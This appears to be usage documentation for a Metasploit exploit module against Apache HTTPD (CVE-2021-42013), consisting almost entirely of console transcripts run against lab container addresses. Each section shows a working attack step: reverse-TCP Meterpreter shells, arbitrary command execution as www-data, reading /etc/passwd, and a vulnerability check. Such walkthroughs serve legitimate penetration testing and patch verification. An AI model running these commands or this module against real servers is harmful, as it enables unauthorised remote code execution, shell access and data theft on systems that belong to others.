# Metasploit: Apache Path Traversal

## Basic: shell && base64

```metasploit
msf6 > use exploits/linux/http/apache_rce_cve2021_42013
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set RLHOST 172.17.0.1
RLHOST => 172.17.0.1
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Sending stage (3020772 bytes) to 172.17.0.2
[+] Deleted /tmp/ujnoYt
[*] Meterpreter session 2 opened (172.17.0.1:4444 -> 172.17.0.2:35830 ) at 2022-03-13 10:10:56 +0100

meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 20.04 (Linux 5.16.0-kali1-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > localtime
Local Date/Time: 2022-03-13 09:13:22 GMT (UTC+0000)
meterpreter > shell
Process 285 created.
Channel 1 created.
uname -a
Linux 14e5c2aa8807 5.16.0-kali1-amd64 #1 SMP PREEMPT Debian 5.16.7-2kali1 (2022-02-10) x86_64 x86_64 x86_64 GNU/Linux
exit
meterpreter > exit -y
[*] Shutting down Meterpreter...

[*] 172.17.0.2 - Meterpreter session 2 closed.  Reason: User exit
```

## Options

```metasploit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > msf6 exploit(linux/http/apache_rce_cve2021_42013) > show options

Module options (exploit/linux/http/apache_rce_cve2021_42013):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   ACTION        EXPLOIT          yes       Action to exploit.
   CODE                           no        The custom code to execute.
   ENCODE        base64           yes       Encode type.
   FILE                           no        A file to print.
   LANG          sh               yes       Language to use.
   PAYLOAD_PATH  /tmp/ujnoYt      yes       Path to store and execute the payload.
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        172.17.0.2       yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT         80               no        The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI                      no        The URI of the Apache HTTPD Web Server.
   THREADS       1                yes       The number of concurrent threads (max one per host)
   VHOST                          no        HTTP server virtual host


Payload options (linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  172.17.0.1       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Dropper)


```

## Shell && Gzip

```metasploit
msf6 > use exploits/linux/http/apache_rce_cve2021_42013
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set RHOSTS 172.18.0.2
RHOSTS => 172.18.0.2
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set LHOST 172.18.0.1
LHOST => 172.18.0.1
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.18.0.1:4444 
[*] Sending stage (3020772 bytes) to 172.18.0.2
[+] Deleted /tmp/LPwIqN
[*] Meterpreter session 1 opened (172.18.0.1:4444 -> 172.18.0.2:41936 ) at 2022-03-13 11:46:14 +0100

meterpreter > sysinfo
Computer     : 172.18.0.2
OS           : Debian  (Linux 5.16.0-kali1-amd64)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > shell
Process 79 created.
Channel 1 created.
id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)
exit
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.18.0.2 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(linux/http/apache_rce_cve2021_42013) >
```

## Python (2 && 3 - base64 && gzip)

```metasploit
msf6 > use linux/http/apache_rce_cve2021_42013
[*] Using configured payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set RHOSTS 172.17.0.3
RHOSTS => 172.17.0.3
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set LHOST 172.17.0.1
LHOST => 172.17.0.1
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set LANG python2
LANG => python2
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Sending stage (3020772 bytes) to 172.17.0.3
[+] Deleted /tmp/kEaA
[*] Meterpreter session 1 opened (172.17.0.1:4444 -> 172.17.0.3:36356 ) at 2022-03-13 16:43:59 +0100

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.17.0.3 - Meterpreter session 1 closed.  Reason: User exit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set LANG python3
LANG => python3
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set ENCODE gzip
ENCODE => gzip
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.17.0.1:4444 
[*] Sending stage (3020772 bytes) to 172.17.0.3
[+] Deleted /tmp/kEaA
[*] Meterpreter session 2 opened (172.17.0.1:4444 -> 172.17.0.3:36360 ) at 2022-03-13 16:44:45 +0100

meterpreter > exit
[*] Shutting down Meterpreter...

[*] 172.17.0.3 - Meterpreter session 2 closed.  Reason: User exit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exit
```

## Command

```metasploit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set ACTION EXECUTE_CODE
ACTION => EXECUTE_CODE                                                                                                                                     
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set CODE "id"                                                                                  
CODE => id                                                                                                                                                 
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit                                                                                                
                                                                                                                                                           
[*] Started reverse TCP handler on 172.18.0.1:4444                                                                                                         
[+] Success, code output:                                                                                                                                  
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                      
                                                                                                                                                           
[!] This exploit may require manual cleanup of '/tmp/LPwIqN' on the target                                                                                 
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/apache_rce_cve2021_42013) >
```

## File

```metasploit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set ACTION READ_FILE
ACTION => READ_FILE
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set FILE /etc/passwd
FILE => /etc/passwd
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.18.0.1:4444 
[+] Success, file content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/apache_rce_cve2021_42013) >
```

## Check

```metasploit
msf6 exploit(linux/http/apache_rce_cve2021_42013) > set ACTION CHECK
ACTION => CHECK
msf6 exploit(linux/http/apache_rce_cve2021_42013) > exploit

[*] Started reverse TCP handler on 172.18.0.1:4444 
[+] The Apache HTTPD server targeted is vulnerable.
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/apache_rce_cve2021_42013) >
```